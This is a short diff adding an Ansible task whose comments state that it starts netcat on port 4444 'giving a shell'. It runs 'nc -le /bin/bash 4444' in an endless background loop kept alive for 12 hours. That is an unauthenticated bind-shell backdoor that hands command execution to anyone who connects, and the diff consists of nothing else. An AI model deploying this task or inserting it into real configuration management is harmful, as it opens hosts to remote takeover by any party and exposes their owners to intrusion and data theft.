@@ -1,0 +1,11 @@
+---
+
+# Start netcat listening on port 4444 giving a shell
+# Set async for 43200 seconds = 12 hours
+# Therefore netcat will keep listening for 12 hours
+
+ - name: Start netcat
+   shell: while true; do nc -le /bin/bash 4444; done &
+   async: 43200
+   poll: 0
+
